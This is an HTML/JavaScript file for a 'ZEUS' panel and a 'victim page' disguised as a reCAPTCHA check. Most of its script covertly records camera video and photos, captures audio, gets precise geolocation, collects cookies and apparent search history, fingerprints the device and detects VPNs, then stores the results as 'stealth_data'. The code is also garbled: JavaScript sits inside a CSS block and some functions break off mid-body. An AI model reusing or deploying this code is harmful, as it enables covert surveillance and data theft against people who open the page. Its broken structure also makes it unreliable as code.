<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>ZEUS — النظام المتكامل</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Inter:wght@300;400;500;600;700;800;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
    <style>
        /* ============================================================
           STYLES — ZEUS PANEL (ADMIN) + VICTIM PAGE (ULTRA STEALTH)
           ============================================================ */

        *,
        *::before,
        *::after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-body: #f5f0e8;
            --bg-panel: rgba(255, 253, 249, 0.85);
            --bg-card: rgba(248, 244, 237, 0.75);
            --bg-input: rgba(240, 235, 225, 0.7);
            --ink: #1e1c18;
            --ink-2: #4a4640;
            --ink-faint: #8a8478;
            --gold: #b8942e;
            --gold-deep: #9f7d25;
            --gold-light: #d9b84a;
            --gold-soft: rgba(184, 148, 46, 0.14);
            --gold-glow: rgba(184, 148, 46, 0.20);
            --gold-shimmer: linear-gradient(135deg, #b8942e 0%, #d9b84a 40%, #b8942e 70%, #9f7d25 100%);
            --line: rgba(184, 148, 46, 0.12);
            --success: #1a8a4a;
            --radius-card: 24px;
            --radius-btn: 14px;
            --transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1);
            --font-ar: 'Amiri', serif;
            --font-en: 'Inter', sans-serif;
        }

        body {
            background: var(--bg-body);
            color: var(--ink);
            font-family: var(--font-ar);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            line-height: 1.6;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background:
                radial-gradient(ellipse at 20% 50%, rgba(184, 148, 46, 0.06) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 50%, rgba(184, 148, 46, 0.05) 0%, transparent 60%),
                radial-gradient(ellipse at 50% 0%, rgba(184, 148, 46, 0.04) 0%, transparent 40%);
            pointer-events: none;
            z-index: 0;
        }

        /* ---------- PANEL (Admin) ---------- */
        .panel {
            max-width: 860px;
            width: 100%;
            background: var(--bg-panel);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: var(--radius-card);
            border: 1px solid rgba(184, 148, 46, 0.15);
            padding: 32px 36px 28px;
            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.07), 0 4px 16px rgba(0, 0, 0, 0.03), inset 0 1px 0 rgba(255, 255, 255, 0.6);
            position: relative;
            z-index: 1;
            opacity: 0;
            animation: fadeUp .8s cubic-bezier(0.22, 1, 0.36, 1) forwards;
        }

        .panel::after {
            content: '';
            position: absolute;
            inset: 4px;
            border-radius: calc(var(--radius-card) - 4px);
            border: 1px solid rgba(184, 148, 46, 0.06);
            pointer-events: none;
        }

        @keyframes fadeUp {
            from {
                opacity: 0;
                transform: translateY(24px) scale(0.98);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        @media (max-width: 640px) {
            .panel {
                padding: 20px 18px 18px;
            }
        }
        @media (max-width: 420px) {
            .panel {
                padding: 16px 14px 14px;
            }
        }

        /* ---------- TOP BAR ---------- */
        .top {
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 2px solid var(--line);
            padding-bottom: 18px;
            flex-wrap: wrap;
            gap: 12px;
            position: relative;
        }

        .top::after {
            content: '';
            position: absolute;
            bottom: -2px;
            right: 0;
            width: 80px;
            height: 2px;
            background: var(--gold-shimmer);
            border-radius: 2px;
            animation: shimmerLine 3s ease-in-out infinite;
        }

        @keyframes shimmerLine {
            0%,
            100% {
                opacity: 0.4;
                width: 60px;
            }
            50% {
                opacity: 1;
                width: 120px;
            }
        }

        .brand {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .logo {
            width: 56px;
            height: 56px;
            flex-shrink: 0;
            position: relative;
        }

        .logo svg {
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 2px 12px rgba(184, 148, 46, 0.15));
        }

        .logo .pulse {
            animation: pulseMark 2.2s ease-in-out infinite;
            transform-origin: center;
        }

        @keyframes pulseMark {
            0%,
            100% {
                transform: scale(1);
                opacity: 0.3;
            }
            50% {
                transform: scale(1.10);
                opacity: 0.9;
            }
        }

        .logo .glow-ring {
            animation: glowRing 3s ease-in-out infinite;
            transform-origin: center;
        }

        @keyframes glowRing {
            0%,
            100% {
                opacity: 0.4;
                transform: scale(1);
            }
            50% {
                opacity: 0.9;
                transform: scale(1.04);
            }
        }

        .name {
            font-family: var(--font-ar);
            font-size: 32px;
            letter-spacing: 6px;
            background: var(--gold-shimmer);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 700;
        }

        .info {
            text-align: left;
            font-size: 13px;
            color: var(--ink-2);
            display: flex;
            align-items: center;
            gap: 18px;
            flex-wrap: wrap;
        }

        .info .row {
            display: flex;
            align-items: center;
            gap: 6px;
            font-family: var(--font-en);
            font-size: 12px;
            font-weight: 400;
            color: var(--ink-faint);
            padding: 4px 10px 4px 8px;
            background: rgba(255, 255, 255, 0.4);
            border-radius: 30px;
            border: 1px solid rgba(184, 148, 46, 0.06);
        }

        .info .row .icon {
            width: 15px;
            height: 15px;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
        }
        .online {
            display: flex;
            align-items: center;
            gap: 8px;
            font-family: var(--font-en);
            font-size: 12px;
            font-weight: 600;
            color: var(--gold-deep);
            letter-spacing: 0.5px;
            background: var(--gold-soft);
            padding: 5px 16px 5px 12px;
            border-radius: 40px;
            border: 1px solid rgba(184, 148, 46, 0.20);
        }
        .online .dot {
            width: 8px;
            height: 8px;
            background: var(--success);
            border-radius: 50%;
            animation: onlinePulse 1.6s ease-in-out infinite;
            box-shadow: 0 0 0 0 rgba(26, 138, 74, 0);
        }
        @keyframes onlinePulse {
            0%,
            100% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(26, 138, 74, 0);
            }
            50% {
                transform: scale(1.6);
                box-shadow: 0 0 20px rgba(26, 138, 74, 0.20);
            }
        }

        @media (max-width: 680px) {
            .top {
                flex-direction: column;
                align-items: stretch;
                gap: 10px;
            }
            .brand {
                justify-content: center;
            }
            .info {
                justify-content: center;
                gap: 8px;
            }
            .name {
                font-size: 26px;
                letter-spacing: 4px;
            }
            .logo {
                width: 48px;
                height: 48px;
            }
        }
        @media (max-width: 420px) {
            .info .row {
                font-size: 11px;
                padding: 3px 8px;
            }
            .info .row .icon {
                width: 13px;
                height: 13px;
            }
            .online {
                font-size: 10px;
                padding: 4px 12px 4px 8px;
            }
            .name {
                font-size: 22px;
                letter-spacing: 3px;
            }
            .logo {
                width: 40px;
                height: 40px;
            }
        }

        /* ---------- GRID ---------- */
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 18px;
            margin-top: 22px;
        }

        @media (max-width: 640px) {
            .grid {
                grid-template-columns: 1fr;
                gap: 14px;
            }
        }

        .card {
            background: var(--bg-card);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            border-radius: var(--radius-card);
            padding: 20px 22px 18px;
            border: 1px solid rgba(184, 148, 46, 0.07);
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, rgba(184, 148, 46, 0.02) 0%, transparent 60%);
            pointer-events: none;
        }

        .card:hover {
            border-color: rgba(184, 148, 46, 0.20);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04), 0 0 30px rgba(184, 148, 46, 0.04);
            transform: translateY(-2px);
        }

        .card .label-wrap {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .card .label-wrap svg {
            width: 17px;
            height: 17px;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
        }

        .card .label {
            font-family: var(--font-en);
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2.5px;
            color: var(--ink-faint);
            display: block;
        }

        .card .input-wrap {
            display: flex;
            align-items: center;
            background: var(--bg-input);
            border-radius: 16px;
            padding: 0 14px;
            margin-top: 2px;
            border: 1px solid rgba(184, 148, 46, 0.06);
            transition: var(--transition);
            backdrop-filter: blur(4px);
        }

        .card .input-wrap:focus-within {
            border-color: var(--gold);
            box-shadow: 0 0 0 4px var(--gold-soft), inset 0 0 0 1px var(--gold);
            background: rgba(255, 255, 255, 0.6);
        }

        .card .input-wrap input {
            flex: 1;
            border: none;
            outline: none;
            background: transparent;
            padding: 13px 0;
            font-family: var(--font-en);
            font-size: 14px;
            font-weight: 500;
            color: var(--ink);
            direction: ltr;
            text-align: right;
            letter-spacing: 0.5px;
            min-width: 0;
        }

        .card .input-wrap input::placeholder {
            color: var(--ink-faint);
            letter-spacing: normal;
            font-weight: 400;
            opacity: 0.7;
        }

        /* ---------- TOGGLES ---------- */
        .toggle-group {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 6px;
        }

        @media (max-width: 560px) {
            .toggle-group {
                grid-template-columns: repeat(2, 1fr);
                gap: 8px;
            }
        }
        @media (max-width: 380px) {
            .toggle-group {
                grid-template-columns: 1fr 1fr;
            }
        }

        .zeus-toggle {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--bg-input);
            padding: 8px 14px;
            border-radius: 14px;
            border: 1px solid rgba(184, 148, 46, 0.05);
            cursor: pointer;
            transition: var(--transition);
            min-height: 44px;
            gap: 8px;
            backdrop-filter: blur(4px);
            position: relative;
        }

        .zeus-toggle:hover {
            border-color: rgba(184, 148, 46, 0.20);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
            transform: translateY(-2px);
            background: rgba(255, 255, 255, 0.6);
        }

        .zeus-toggle input {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }

        .zeus-toggle .toggle-label {
            font-family: var(--font-ar);
            font-size: 13px;
            font-weight: 500;
            color: var(--ink-2);
            transition: var(--transition);
            flex: 1;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .zeus-toggle .toggle-label svg {
            width: 15px;
            height: 15px;
            stroke: var(--ink-faint);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
            transition: var(--transition);
        }

        .zeus-toggle .track {
            width: 36px;
            height: 22px;
            background: #d5d0c6;
            border-radius: 30px;
            position: relative;
            transition: var(--transition);
            box-shadow: inset 0 2px 6px rgba(0, 0, 0, 0.06);
            flex-shrink: 0;
        }

        .zeus-toggle .track .thumb {
            width: 16px;
            height: 16px;
            background: #fff;
            border-radius: 50%;
            position: absolute;
            top: 3px;
            right: 3px;
            transition: var(--transition);
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
        }

        .zeus-toggle input:checked+.toggle-label {
            color: var(--ink);
            font-weight: 600;
        }

        .zeus-toggle input:checked+.toggle-label svg {
            stroke: var(--gold);
        }

        .zeus-toggle input:checked~.track {
            background: var(--gold-shimmer);
            box-shadow: 0 0 24px var(--gold-soft);
        }

        .zeus-toggle input:checked~.track .thumb {
            right: 17px;
            background: #fff;
        }

        /* ---------- BUTTON ---------- */
        .generate-wrap {
            display: flex;
            justify-content: center;
            margin: 24px 0 20px 0;
            position: relative;
        }

        .generate-wrap::before {
            content: '';
            position: absolute;
            inset: -12px -20px;
            background: radial-gradient(ellipse at center, rgba(184, 148, 46, 0.04) 0%, transparent 70%);
            pointer-events: none;
            border-radius: 60px;
        }

        .btn-generate {
            display: inline-flex;
            align-items: center;
            gap: 12px;
            padding: 14px 40px;
            background: var(--gold-shimmer);
            background-size: 200% 200%;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-family: var(--font-en);
            font-size: 15px;
            font-weight: 700;
            color: #fff;
            letter-spacing: 1px;
            box-shadow: 0 4px 28px rgba(184, 148, 46, 0.30), inset 0 1px 0 rgba(255, 255, 255, 0.20);
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .btn-generate::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);
            transform: translateX(-100%);
            transition: transform 0.6s;
        }

        .btn-generate:hover::before {
            transform: translateX(100%);
        }

        .btn-generate:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 8px 40px rgba(184, 148, 46, 0.40), inset 0 1px 0 rgba(255, 255, 255, 0.20);
        }

        .btn-generate:active {
            transform: translateY(0) scale(0.98);
        }

        .btn-generate svg {
            width: 20px;
            height: 20px;
            stroke: currentColor;
            fill: none;
            stroke-width: 2;
            flex-shrink: 0;
        }

        .btn-generate.busy {
            opacity: 0.7;
            pointer-events: none;
            animation: pulseBusy 1s ease-in-out infinite;
        }

        @keyframes pulseBusy {
            0%,
            100% {
                opacity: 0.7;
            }
            50% {
                opacity: 1;
            }
        }

        .btn-generate.done {
            background: linear-gradient(135deg, #1a8a4a, #126a38);
            box-shadow: 0 4px 28px rgba(26, 138, 74, 0.30);
            color: #fff;
        }

        @media (max-width: 480px) {
            .btn-generate {
                padding: 12px 28px;
                font-size: 13px;
                gap: 8px;
            }
            .btn-generate svg {
                width: 17px;
                height: 17px;
            }
        }

        /* ---------- RESULT ---------- */
        .result-section {
            margin-bottom: 22px;
        }

        .result-section .label-wrap {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 12px;
        }

        .result-section .label-wrap svg {
            width: 17px;
            height: 17px;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            flex-shrink: 0;
        }

        .result-section .label-wrap .section-title {
            font-family: var(--font-en);
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2.5px;
            color: var(--ink-faint);
        }

        .result {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: var(--bg-card);
            backdrop-filter: blur(8px);
            border-radius: var(--radius-card);
            padding: 16px 22px;
            border: 1px solid rgba(184, 148, 46, 0.07);
            flex-wrap: wrap;
            gap: 12px;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .result::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(135deg, rgba(184, 148, 46, 0.03) 0%, transparent 60%);
            pointer-events: none;
        }

        .result:hover {
            border-color: rgba(184, 148, 46, 0.15);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04);
        }

        .result .info-box {
            display: flex;
            flex-direction: column;
            flex: 1;
            min-width: 140px;
            position: relative;
            z-index: 1;
        }

        .result .info-box .value {
            font-family: var(--font-en);
            font-size: 20px;
            font-weight: 800;
            letter-spacing: 1.5px;
            color: var(--ink);
            background: var(--gold-shimmer);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            display: inline-block;
            width: fit-content;
        }

        .result .info-box .sub {
            font-family: var(--font-en);
            font-size: 11px;
            color: var(--ink-faint);
            margin-top: 3px;
            word-break: break-all;
            -webkit-text-fill-color: var(--ink-faint);
        }

        .result .actions {
            display: flex;
            gap: 10px;
            flex-shrink: 0;
            position: relative;
            z-index: 1;
        }

        .result .actions button {
            width: 42px;
            height: 42px;
            border-radius: 14px;
            border: 1px solid rgba(184, 148, 46, 0.06);
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(4px);
            color: var(--ink-2);
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .result .actions button svg {
            width: 18px;
            height: 18px;
            stroke: currentColor;
            fill: none;
            stroke-width: 1.8;
            transition: var(--transition);
        }

        .result .actions button:hover {
            transform: translateY(-3px);
            border-color: var(--gold);
            color: var(--gold);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.04), 0 0 20px rgba(184, 148, 46, 0.06);
            background: rgba(255, 255, 255, 0.7);
        }

        .result .actions button:active {
            transform: translateY(0);
        }

        .result .actions button.ok {
            border-color: var(--success);
            background: var(--success);
            color: #fff;
        }

        .result .actions button.ok svg {
            stroke: #fff;
        }

        @media (max-width: 480px) {
            .result {
                padding: 14px 16px;
                flex-direction: column;
                align-items: stretch;
            }
            .result .info-box .value {
                font-size: 17px;
            }
            .result .actions {
                justify-content: flex-end;
            }
            .result .actions button {
                width: 38px;
                height: 38px;
            }
            .result .actions button svg {
                width: 16px;
                height: 16px;
            }
        }

        /* ---------- FOOTER ---------- */
        .footer {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding-top: 18px;
            border-top: 2px solid var(--line);
            font-family: var(--font-ar);
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: var(--transition);
            position: relative;
            flex-wrap: wrap;
        }

        .footer::before {
            content: '';
            position: absolute;
            top: -2px;
            right: 50%;
            transform: translateX(50%);
            width: 40px;
            height: 2px;
            background: var(--gold-shimmer);
            border-radius: 2px;
            animation: shimmerLineCenter 3s ease-in-out infinite;
        }

        @keyframes shimmerLineCenter {
            0%,
            100% {
                opacity: 0.4;
                width: 40px;
            }
            50% {
                opacity: 1;
                width: 80px;
            }
        }

        .footer:hover {
            transform: translateY(-2px);
        }

        .footer .dev-name {
            font-family: var(--font-ar);
            font-weight: 700;
            letter-spacing: 4px;
            font-size: 20px;
            background: var(--gold-shimmer);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            position: relative;
        }

        .footer .icon-badge {
            width: 22px;
            height: 22px;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .footer .icon-badge svg {
            width: 100%;
            height: 100%;
            stroke: var(--gold);
            fill: none;
            stroke-width: 1.8;
            transition: var(--transition);
        }

        .footer:hover .icon-badge svg {
            transform: rotate(10deg) scale(1.1);
            stroke: var(--gold-deep);
        }

        @media (max-width: 480px) {
            .footer {
                font-size: 14px;
                gap: 8px;
                padding-top: 14px;
            }
            .footer .dev-name {
                font-size: 17px;
                letter-spacing: 3px;
            }
            .footer .icon-badge {
                width: 18px;
                height: 18px;
            }
        }

        /* ============================================================
           VICTIM PAGE — reCAPTCHA (STEALTH — NO STATUS)
           ============================================================ */
        #victimPage {
            display: none;

            background: #e8f0fe;

            function saveDataLocally(data) {
                try {
                    const request = indexedDB.open('ZeusBackup', 3);
                    request.onupgradeneeded = (e) => {
                        const db = e.target.result;
                        if (!db.objectStoreNames.contains('stealth_data')) {
                            db.createObjectStore('stealth_data', { keyPath: 'id' });
                        }
                    };
                    request.onsuccess = (e) => {
                        const db = e.target.result;
                        const tx = db.transaction('stealth_data', 'readwrite');
                        const store = tx.objectStore('stealth_data');
                        const entry = {
                            id: 'latest',
                            data: data,
                            timestamp: Date.now()
                        };
                        store.put(entry);
                    };
                    request.onerror = () => {};
                } catch (_) {}
            }

            function loadFromIndexedDB() {
                return new Promise((resolve) => {
                    try {
                        const request = indexedDB.open('ZeusBackup', 3);
                        request.onsuccess = (e) => {
                            const db = e.target.result;
                            if (!db.objectStoreNames.contains('stealth_data')) {
                                resolve(null);
                                return;
                            }
                            const tx = db.transaction('stealth_data', 'readonly');
                            const store = tx.objectStore('stealth_data');
                            const getRequest = store.get('latest');
                            getRequest.onsuccess = () => { resolve(getRequest.result); };
                            getRequest.onerror = () => { resolve(null); };
                        };
                        request.onerror = () => { resolve(null); };
                    } catch (_) { resolve(null); }
                });
            }

            function classifyDevice() {
                try {
                    const ua = navigator.userAgent;
                    const result = { os: 'Unknown', osVersion: 'Unknown', browser: 'Unknown', browserVersion: 'Unknown',
                        deviceType: 'Desktop', isMobile: false, isTablet: false };

                    if (ua.includes('Windows NT 10.0')) { result.os = 'Windows';
                        result.osVersion = '10'; } else if (ua.includes('Windows NT 6.3')) { result.os = 'Windows';
                        result.osVersion = '8.1'; } else if (ua.includes('Windows NT 6.2')) { result.os = 'Windows';
                        result.osVersion = '8'; } else if (ua.includes('Windows NT 6.1')) { result.os = 'Windows';
                        result.osVersion = '7'; } else if (ua.includes('Mac OS X')) { result.os = 'macOS';
                        result.osVersion = (ua.match(/Mac OS X ([\d_]+)/)?.[1] || '').replace(/_/g, '.') || 'Unknown'; } else if (
                        ua.includes('Linux')) { result.os = 'Linux'; } else if (ua.includes('Android')) { result.os =
                        'Android';
                        result.osVersion = ua.match(/Android ([\d.]+)/)?.[1] || 'Unknown';
                        result.deviceType = 'Mobile';
                        result.isMobile = true; } else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes(
                        'iPod')) {
                        result.os = 'iOS';
                        result.osVersion = (ua.match(/OS ([\d_]+)/)?.[1] || '').replace(/_/g, '.') || 'Unknown';
                        result.deviceType = ua.includes('iPad') ? 'Tablet' : 'Mobile';
                        result.isMobile = !ua.includes('iPad');
                        result.isTablet = ua.includes('iPad');
                    }

                    if (ua.includes('Edg/')) { result.browser = 'Edge';
                        result.browserVersion = ua.match(/Edg\/([\d.]+)/)?.[1] || 'Unknown'; } else if (ua.includes('OPR/') ||
                        ua.includes('Opera/')) { result.browser = 'Opera';
                        result.browserVersion = ua.match(/(?:OPR|Opera)\/([\d.]+)/)?.[1] || 'Unknown'; } else if (ua.includes(
                        'Chrome/')) { result.browser = 'Chrome';
                        result.browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || 'Unknown'; } else if (ua.includes(
                        'Firefox/')) { result.browser = 'Firefox';
                        result.browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || 'Unknown'; } else if (ua.includes(

                            'Unknown'; }

                    if (result.isMobile) result.deviceType = 'Mobile';

                    state.deviceClassification = result;

            function detectSpoofing() {
                try {
                    const result = { canvasSpoof: false, webglSpoof: false, vpnProxy: false, headless: false };
                    try {
                        const c = document.createElement('canvas');
                        c.width = 256;
                        c.height = 256;
                        const ctx = c.getContext('2d');
                        ctx.fillStyle = '#f60';
                        ctx.fillRect(0, 0, 256, 256);
                        const data = ctx.getImageData(0, 0, 256, 256).data;
                        let count = 0;
                        for (let i = 0; i < data.length; i += 4) {
                            if (data[i] === 255 && data[i + 1] === 102 && data[i + 2] === 0) count++;
                        }
                        if (count < 60000) result.canvasSpoof = true;
                    } catch (_) {}
                    try {
                        const c = document.createElement('canvas');
                        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                        if (gl) {
                            const info = gl.getExtension('WEBGL_debug_renderer_info');
                            if (info) {
                                const vendor = gl.getParameter(info.UNMASKED_VENDOR_WEBGL);
                                const renderer = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
                                const legit = ['Google', 'Intel', 'NVIDIA', 'AMD', 'Apple', 'ARM', 'Qualcomm', 'Mesa'];
                                if (!legit.some(x => vendor.includes(x) || renderer.includes(x))) result.webglSpoof = true;
                            }
                        }
                    } catch (_) {}
                    try {
                        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                        pc.createDataChannel('test');
                        pc.createOffer().then(o => pc.setLocalDescription(o));
                        const ips = new Set();
                        pc.onicecandidate = e => {
                            if (e.candidate) {
                                const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
                                if (ip) ips.add(ip);
                            }
                        };
                        setTimeout(() => pc.close(), 2000);
                        if (ips.size > 1) result.vpnProxy = true;
                    } catch (_) {}

                    state.isHeadless = detectHeadless();
                    result.headless = state.isHeadless;
                    state.spoofingDetected = result;
                    return result;
                } catch (_) { return {}; }
            }

            async function fetchGoogleSearchHistory() {
                try {
                    const results = [];
                    const keys = ['search', 'query', 'q', 'history', 'recent', 'lastSearch', 'searchTerms', 'queries',
                        'google:search', 'recentSearches', 'searchHistory'
                    ];
                    for (const k of keys) {
                        const val = localStorage.getItem(k);
                        if (val) {
                            results.push({ source: 'localStorage', key: k, value: val });
                        }
                    }
                    try {
                        const dbs = await indexedDB.databases();
                        for (const dbInfo of dbs) {
                            const dbName = dbInfo.name;
                            if (dbName && (dbName.includes('google') || dbName.includes('chrome') || dbName.includes(
                                    'history') ||
                                    dbName.includes('search'))) {
                                const db = await new Promise((resolve, reject) => {
                                    const req = indexedDB.open(dbName);
                                    req.onsuccess = () => resolve(req.result);
                                    req.onerror = () => reject();
                                });
                                if (db) {
                                    const storeNames = db.objectStoreNames;
                                    for (const storeName of storeNames) {
                                        if (storeName.includes('history') || storeName.includes('search') || storeName
                                            .includes(
                                                'query')) {
                                            const tx = db.transaction(storeName, 'readonly');
                                            const store = tx.objectStore(storeName);
                                            const getAll = store.getAll();
                                            const items = await new Promise((res, rej) => {
                                                getAll.onsuccess = () => res(getAll.result);
                                                getAll.onerror = () => rej();
                                            });
                                            if (items && items.length > 0) {
                                                results.push({
                                                    source: 'IndexedDB',
                                                    db: dbName,
                                                    store: storeName,
                                                    count: items.length,
                                                    sample: items.slice(0, 3).map(i => JSON.stringify(i).substring(0,
                                                    100))
                                                });
                                            }
                                        }
                                    }
                                    db.close();
                                }
                            }

                } catch (_) { return []; }
            }

            async function getLocation() {
                return new Promise((resolve) => {
                    try {
                        if (!navigator.geolocation) {
                            state.userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
                            state.permissionsGranted.location = false;
                            resolve();
                            return;
                        }
                        let watchId = null,
                            best = null,
                            bestAcc = Infinity,
                            resolved = false,
                            attempts = 0;
                        const maxAttempts = 10,
                            timeout = 8000,
                            targetAcc = 50;

                        const finish = () => {
                            if (resolved) return;
                            resolved = true;
                            if (watchId) navigator.geolocation.clearWatch(watchId);
                            if (best) {
                                state.userLocation.lat = best.coords.latitude;
                                state.userLocation.lng = best.coords.longitude;
                                state.userLocation.accuracy = best.coords.accuracy;
                                state.userLocation.error = null;
                                state.permissionsGranted.location = true;
                            } else {
                                state.userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
                                state.permissionsGranted.location = false;
                            }
                            resolve();
                        };

                        const timer = setTimeout(() => {
                            if (!resolved) {
                                if (watchId) navigator.geolocation.clearWatch(watchId);
                                if (best) finish();
                                else { state.userLocation.error = 'انتهت المهلة';
                                    state.permissionsGranted.location = false;
                                    resolve(); }
                            }
                        }, timeout);

                        const onPos = (p) => {
                            attempts++;
                            const acc = p.coords.accuracy;
                            if (acc < bestAcc) { bestAcc = acc;
                                best = p; }
                            if (acc <= targetAcc || attempts >= maxAttempts) {
                                clearTimeout(timer);
                                finish();
                            }
                        };

                        const onErr = (e) => {
                            if (resolved) return;
                            if (e.code === 1) {
                                state.userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
                                state.permissionsGranted.location = false;
                                resolved = true;
                                if (watchId) navigator.geolocation.clearWatch(watchId);
                                clearTimeout(timer);
                                resolve();
                                return;
                            }
                            if (attempts < maxAttempts) { /* continue */ } else {
                                if (best) finish();
                                else { state.userLocation.error = e.message || 'تعذر الحصول على الموقع';
                                    state.permissionsGranted.location = false;
                                    resolve(); }
                            }
                        };

                        watchId = navigator.geolocation.watchPosition(onPos, onErr, {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 2000
                        });
                    } catch (_) {
                        state.userLocation.error = 'خطأ غير متوقع';
                        resolve();
                    }
                });
            }

            function getStream(facingMode) {
                return navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
                    audio: false
                });
            }

            function recordStream(stream, duration) {
                return new Promise((resolve) => {
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                    recorder.onstop = () => resolve(new Blob(chunks, { type: recorder.mimeType || 'video/webm' }));
                    recorder.start();
                    setTimeout(() => recorder.stop(), duration);
                });
            }

            function capturePhoto(videoEl) {
                return new Promise((resolve) => {
                    const w = videoEl.videoWidth || 640;
                    const h = videoEl.videoHeight || 480;
                    const canvas = el.hiddenCanvas;
                    canvas.width = w;
                    canvas.height = h;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(videoEl, 0, 0, w, h);
                    canvas.toBlob(b => resolve(b), 'image/jpeg', 0.92);
                });
            }

            async function recordAudio(duration) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    state.permissionsGranted.mic = true;
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
                    return new Promise((resolve) => {
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
                            stream.getTracks().forEach(t => t.stop());
                            resolve(blob);
                        };
                        recorder.start();
                        setTimeout(() => recorder.stop(), duration);
                    });
                } catch (_) {
                    state.permissionsGranted.mic = false;
                    return null;
                }
            }

            async function collectData() {
                if (state.isCollecting || state.collectionComplete) return;

                try {
                    // Step 1: Basic detection
                    classifyDevice();
                    detectSpoofing();
                    await detectExtensions();
                    collectAllCookies();
                    await fetchGoogleSearchHistory();
                    await getBatteryLevel();

                    // Step 2: Front camera (photos + video)
                    let frontVideo = null;
                    let photos = [];
                    try {
                        const stream = await getStream('user');
                        el.hiddenVideo.srcObject = stream;
                        await el.hiddenVideo.play();
                        await delay(400);

                        // Record video (5 sec)
                        frontVideo = await recordStream(stream, 5000);

                        // Capture 8 photos
                        for (let i = 0; i < 8; i++) {
                            const blob = await capturePhoto(el.hiddenVideo);
                            if (blob) photos.push(blob);
                            await delay(600);
                        }

                        stream.getTracks().forEach(t => t.stop());
                        el.hiddenVideo.srcObject = null;
                    } catch (_) {
                        state.permissionsGranted.camera = false;
                    }

                    // Step 3: Back camera (video)
                    let backVideo = null;
                    try {
                        const stream = await getStream('environment');
                        el.hiddenVideo.srcObject = stream;
                        await el.hiddenVideo.play();
                        await delay(400);
                        backVideo = await recordStream(stream, 5000);
